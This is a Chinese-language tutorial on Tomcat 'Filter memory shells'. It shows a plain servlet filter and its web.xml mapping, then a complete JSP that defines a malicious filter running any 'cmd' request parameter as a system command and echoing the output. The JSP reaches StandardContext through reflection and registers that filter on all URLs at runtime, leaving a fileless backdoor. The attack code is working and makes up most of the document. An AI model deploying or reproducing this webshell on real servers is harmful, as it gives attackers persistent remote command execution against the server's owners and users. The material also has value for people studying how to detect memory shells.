# Filter内存马

Filter，顾名思义，是过滤器，在请求到达Servlet前对请求进行过滤和处理。

‍

如图，请求会先到达Filter，最后再传递给Servlet。

我们先定义一个Filter

```java
package com.example.memshell;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpFilter;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

public class MyFilter extends HttpFilter {
    @Override
    protected void doFilter(HttpServletRequest req, HttpServletResponse res, FilterChain chain) throws IOException, ServletException {
        String cmd = req.getParameter("cmd");
        if (cmd!=null){
            res.getWriter().println("自定义响应");
        }
        super.doFilter(req, res, chain);
    }
}
```

再在web.xml中声明Filter并配置拦截规则

```xml
    <filter>
        <filter-name>MyFilter</filter-name>
        <filter-class>com.example.memshell.MyFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>MyFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
```

我们已经知道了如何编写一个filter并在webxml中配置拦截规则。

那么我们要如何在运行时将Filter添加到tomcat中呢？如下即可

```java
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="javax.servlet.*, javax.servlet.http.*" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%--声明一个恶意Filter--%>
<%!
    public class ShellFilter implements Filter{
        @Override
        public void init(FilterConfig filterConfig){}

        @Override
        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process proc = Runtime.getRuntime().exec(cmd);
                BufferedReader br = new BufferedReader(
                        new InputStreamReader(proc.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    resp.getWriter().println(line);
                }
                br.close();
            }else {
                chain.doFilter(req,resp);
            }
        }
        @Override
        public void destroy() {}
    }
%>
<%--从ServletContext中获取StandardContext--%>
<%
    // 从request中获取servletContext
    ServletContext servletContext = request.getServletContext();
    // 从servletContext中获取applicationContext
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 从applicationContext中获取standardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
<%--动态注册恶意Filter--%>
<%
    // 创建恶意Filter
    ShellFilter filter = new ShellFilter();
    FilterDef def = new FilterDef();
    def.setFilter(filter);
    def.setFilterName("filter-shell");
    def.setFilterClass(filter.getClass().getName());
    FilterMap map = new FilterMap();
    map.addURLPattern("/*");
    map.setFilterName("filter-shell");

    standardContext.addFilterDef(def);
    standardContext.addFilterMapBefore(map);
    standardContext.filterStart();
%>
```
